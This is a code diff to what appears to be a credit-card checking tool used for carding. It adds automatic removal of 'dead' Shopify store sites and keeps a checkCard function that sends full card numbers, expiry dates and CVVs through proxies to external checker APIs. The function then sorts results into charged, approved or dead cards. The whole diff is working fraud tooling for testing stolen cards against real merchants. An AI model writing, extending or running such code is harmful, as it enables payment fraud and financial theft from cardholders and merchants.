@@ -1288,6 +1288,27 @@
             ANDROID_UA: 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36'
         };
 
+        // ================================================================
+// 🔥 AUTO-REMOVE DEAD SITE - Called whenever a site is found dead
+// ================================================================
+function autoRemoveDeadSite(siteUrl) {
+    // Find the site in the list
+    for (let i = state.sites.length - 1; i >= 0; i--) {
+        const site = state.sites[i];
+        const currentUrl = typeof site === 'object' ? site.url : site;
+        
+        if (currentUrl === siteUrl) {
+            // 🔥 Remove the dead site immediately
+            state.sites.splice(i, 1);
+            logDebug(`🗑️ Auto-removed dead site: ${siteUrl}`, 'warning');
+            renderSites();
+            updateStats();
+            return true;
+        }
+    }
+    return false;
+}
+        
         // ===== DEBUG LOGGER =====
         let debugLogs = [];
         let debugVisible = false;
@@ -1954,155 +1975,159 @@
         // ================================================================
         // 🔥 FIXED: CHECK CARD - Handles objects AND strings
         // ================================================================
-        async function checkCard(card, site, proxy) {
-            // 🔥 FIX: Handle site as object or string
-            if (typeof site === 'object' && site !== null) {
-                site = site.url || site.toString();
+       async function checkCard(card, site, proxy) {
+    // 🔥 FIX: Handle site as object or string
+    if (typeof site === 'object' && site !== null) {
+        site = site.url || site.toString();
+    }
+    if (typeof site !== 'string') {
+        site = String(site);
+    }
+    
+    const startTime = Date.now();
+    logDebug(`🔍 Checking: ${maskCard(card)} on ${site}`, 'info');
+    
+    try {
+        const parts = card.split('|');
+        if (parts.length !== 4) {
+            logDebug(`❌ Invalid format: ${card}`, 'error');
+            return { status: 'Invalid', message: 'Invalid format', card: card };
+        }
+        
+        if (!site.startsWith('http')) site = 'https://' + site;
+        
+        let proxyStr = proxy;
+        if (proxy) {
+            if (typeof proxy === 'object' && proxy !== null) {
+                proxyStr = proxy.proxy || proxy.toString();
             }
-            if (typeof site !== 'string') {
-                site = String(site);
+            if (typeof proxyStr !== 'string') {
+                proxyStr = String(proxyStr);
             }
-            
-            const startTime = Date.now();
-            logDebug(`🔍 Checking: ${maskCard(card)} on ${site}`, 'info');
-            
-            try {
-                const parts = card.split('|');
-                if (parts.length !== 4) {
-                    logDebug(`❌ Invalid format: ${card}`, 'error');
-                    return { status: 'Invalid', message: 'Invalid format', card: card };
-                }
-                
-                if (!site.startsWith('http')) site = 'https://' + site;
-                
-                let proxyStr = proxy;
-                if (proxy) {
-                    if (typeof proxy === 'object' && proxy !== null) {
-                        proxyStr = proxy.proxy || proxy.toString();
-                    }
-                    if (typeof proxyStr !== 'string') {
-                        proxyStr = String(proxyStr);
-                    }
-                    const proxyParts = proxyStr.split(':');
-                    if (proxyParts.length === 4) {
-                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
-                    } else if (proxyParts.length === 2) {
-                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
-                    }
-                }
-                if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
-                
-                const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
-                const url = `${apiBase}/shopify?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}&cc=${card}`;
-                logDebug(`📡 URL: ${url.substring(0, 80)}...`, 'info');
-                
-                const response = await fetch(url, {
-                    headers: {
-                        'Accept': 'application/json',
-                        'User-Agent': CONFIG.ANDROID_UA,
-                        'X-Requested-With': 'XMLHttpRequest'
-                    }
-                });
-                
-                const elapsed = Date.now() - startTime;
-                logDebug(`⏱️ Response time: ${elapsed}ms`, 'info');
-                
-                if (!response.ok) {
-                    logDebug(`❌ HTTP ${response.status}: ${response.statusText}`, 'error');
-                    return { status: 'Site Error', message: `HTTP ${response.status}`, card: card, retry: true };
-                }
-                
-                const raw = await response.json();
-                logDebug(`📄 Response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
-                
-                const responseMsg = raw.Response || raw.card_response || '';
-                const price = raw.Price || raw.price || '-';
-                const priceValue = getPriceFromResponse(raw);
-                const priceDisplay = (price !== '-' && price !== 0) ? `$${price}` : '-';
-                const gateway = raw.Gate || raw.Gateway || raw.gate || 'Shopify Payments';
-                
-                if (isSiteDead(responseMsg, gateway, priceDisplay)) {
-                    logDebug(`⚠️ Site is dead`, 'warning');
-                    return {
-                        status: 'Site Error',
-                        message: responseMsg || 'Site is dead',
-                        card: card,
-                        retry: true,
-                        gateway: gateway,
-                        price: priceDisplay,
-                        price_value: priceValue
-                    };
-                }
-                
-                const r = responseMsg.toLowerCase();
-                if (r.includes('charged') || r.includes('order_placed') || 
-                    r.includes('thank you') || r.includes('payment successful')) {
-                    logDebug(`💎 CHARGED! ${maskCard(card)}`, 'success');
-                    return {
-                        status: 'Charged',
-                        message: responseMsg,
-                        card: card,
-                        site: site,
-                        gateway: gateway,
-                        price: priceDisplay,
-                        price_value: priceValue,
-                        responseType: 'ORDER_PLACED'
-                    };
-                } else if (r.includes('approved') || r.includes('success') || 
-                    r.includes('insufficient_funds') || r.includes('insufficient funds') ||
-                    r.includes('invalid_cvv') || r.includes('incorrect_cvv') || 
-                    r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
-                    r.includes('invalid cvv') || r.includes('incorrect cvv') ||
-                    r.includes('invalid cvc') || r.includes('incorrect cvc') ||
-                    r.includes('incorrect_zip') || r.includes('incorrect zip') ||
-                    r.includes('cvv issue') || r.includes('3d') || r.includes('3d secure') ||
-                    r.includes('otp') || r.includes('verification required') ||
-                    r.includes('authenticate') || r.includes('authentication required') ||
-                    r.includes('challenge required') || r.includes('redirecting to bank') ||
-                    r.includes('bank verification') || r.includes('send code') ||
-                    r.includes('enter code') || r.includes('verify')) {
-                    logDebug(`✅ APPROVED! ${maskCard(card)}`, 'success');
-                    let respType = 'APPROVED';
-                    if (r.includes('insufficient_funds') || r.includes('insufficient funds')) respType = 'INSUFFICIENT_FUNDS';
-                    else if (r.includes('3d') || r.includes('3d secure') || r.includes('challenge required') || r.includes('redirecting to bank') || 
-                             r.includes('otp') || r.includes('verification required') || r.includes('authenticate')) respType = '3DS_REQUIRED';
-                    else if (r.includes('invalid_cvv') || r.includes('incorrect_cvv') || r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
-                             r.includes('cvv issue')) respType = 'CVV_ISSUE';
-                    return {
-                        status: 'Approved',
-                        message: responseMsg,
-                        card: card,
-                        site: site,
-                        gateway: gateway,
-                        price: priceDisplay,
-                        price_value: priceValue,
-                        responseType: respType
-                    };
-                } else {
-                    logDebug(`❌ DECLINED: ${responseMsg.substring(0, 30)}`, 'error');
-                    return {
-                        status: 'Dead',
-                        message: responseMsg,
-                        card: card,
-                        site: site,
-                        gateway: gateway,
-                        price: priceDisplay,
-                        price_value: priceValue,
-                        responseType: 'DEAD'
-                    };
-                }
-            } catch (error) {
-                const elapsed = Date.now() - startTime;
-                logDebug(`❌ EXCEPTION after ${elapsed}ms: ${error.message}`, 'error');
-                return {
-                    status: 'Site Error',
-                    message: error.message || 'API Error',
-                    card: card,
-                    retry: true
-                };
+            const proxyParts = proxyStr.split(':');
+            if (proxyParts.length === 4) {
+                proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
+            } else if (proxyParts.length === 2) {
+                proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
             }
         }
-
+        if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
+        
+        const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
+        const url = `${apiBase}/shopify?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}&cc=${card}`;
+        logDebug(`📡 URL: ${url.substring(0, 80)}...`, 'info');
+        
+        const response = await fetch(url, {
+            headers: {
+                'Accept': 'application/json',
+                'User-Agent': CONFIG.ANDROID_UA,
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+        });
+        
+        const elapsed = Date.now() - startTime;
+        logDebug(`⏱️ Response time: ${elapsed}ms`, 'info');
+        
+        if (!response.ok) {
+            logDebug(`❌ HTTP ${response.status}: ${response.statusText}`, 'error');
+            return { status: 'Site Error', message: `HTTP ${response.status}`, card: card, retry: true };
+        }
+        
+        const raw = await response.json();
+        logDebug(`📄 Response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
+        
+        const responseMsg = raw.Response || raw.card_response || '';
+        const price = raw.Price || raw.price || '-';
+        const priceValue = getPriceFromResponse(raw);
+        const priceDisplay = (price !== '-' && price !== 0) ? `$${price}` : '-';
+        const gateway = raw.Gate || raw.Gateway || raw.gate || 'Shopify Payments';
+        
+        // 🔥 CHECK IF SITE IS DEAD AND AUTO-REMOVE IT
+        if (isSiteDead(responseMsg, gateway, priceDisplay)) {
+            logDebug(`⚠️ Site is dead: ${site}`, 'warning');
+            
+            // 🔥 AUTO-REMOVE THE DEAD SITE FROM THE LIST
+            autoRemoveDeadSite(site);
+            
+            return {
+                status: 'Site Error',
+                message: responseMsg || 'Site is dead - auto-removed',
+                card: card,
+                retry: true,
+                gateway: gateway,
+                price: priceDisplay,
+                price_value: priceValue
+            };
+        }
+        
+        const r = responseMsg.toLowerCase();
+        if (r.includes('charged') || r.includes('order_placed') || 
+            r.includes('thank you') || r.includes('payment successful')) {
+            logDebug(`💎 CHARGED! ${maskCard(card)}`, 'success');
+            return {
+                status: 'Charged',
+                message: responseMsg,
+                card: card,
+                site: site,
+                gateway: gateway,
+                price: priceDisplay,
+                price_value: priceValue,
+                responseType: 'ORDER_PLACED'
+            };
+        } else if (r.includes('approved') || r.includes('success') || 
+            r.includes('insufficient_funds') || r.includes('insufficient funds') ||
+            r.includes('invalid_cvv') || r.includes('incorrect_cvv') || 
+            r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
+            r.includes('invalid cvv') || r.includes('incorrect cvv') ||
+            r.includes('invalid cvc') || r.includes('incorrect cvc') ||
+            r.includes('incorrect_zip') || r.includes('incorrect zip') ||
+            r.includes('cvv issue') || r.includes('3d') || r.includes('3d secure') ||
+            r.includes('otp') || r.includes('verification required') ||
+            r.includes('authenticate') || r.includes('authentication required') ||
+            r.includes('challenge required') || r.includes('redirecting to bank') ||
+            r.includes('bank verification') || r.includes('send code') ||
+            r.includes('enter code') || r.includes('verify')) {
+            logDebug(`✅ APPROVED! ${maskCard(card)}`, 'success');
+            let respType = 'APPROVED';
+            if (r.includes('insufficient_funds') || r.includes('insufficient funds')) respType = 'INSUFFICIENT_FUNDS';
+            else if (r.includes('3d') || r.includes('3d secure') || r.includes('challenge required') || r.includes('redirecting to bank') || 
+                     r.includes('otp') || r.includes('verification required') || r.includes('authenticate')) respType = '3DS_REQUIRED';
+            else if (r.includes('invalid_cvv') || r.includes('incorrect_cvv') || r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
+                     r.includes('cvv issue')) respType = 'CVV_ISSUE';
+            return {
+                status: 'Approved',
+                message: responseMsg,
+                card: card,
+                site: site,
+                gateway: gateway,
+                price: priceDisplay,
+                price_value: priceValue,
+                responseType: respType
+            };
+        } else {
+            logDebug(`❌ DECLINED: ${responseMsg.substring(0, 30)}`, 'error');
+            return {
+                status: 'Dead',
+                message: responseMsg,
+                card: card,
+                site: site,
+                gateway: gateway,
+                price: priceDisplay,
+                price_value: priceValue,
+                responseType: 'DEAD'
+            };
+        }
+    } catch (error) {
+        const elapsed = Date.now() - startTime;
+        logDebug(`❌ EXCEPTION after ${elapsed}ms: ${error.message}`, 'error');
+        return {
+            status: 'Site Error',
+            message: error.message || 'API Error',
+            card: card,
+            retry: true
+        };
+    }
+}
         // ================================================================
         // 🔥 FIXED: CHECK CARD WITH RETRY - Handles objects
         // ================================================================
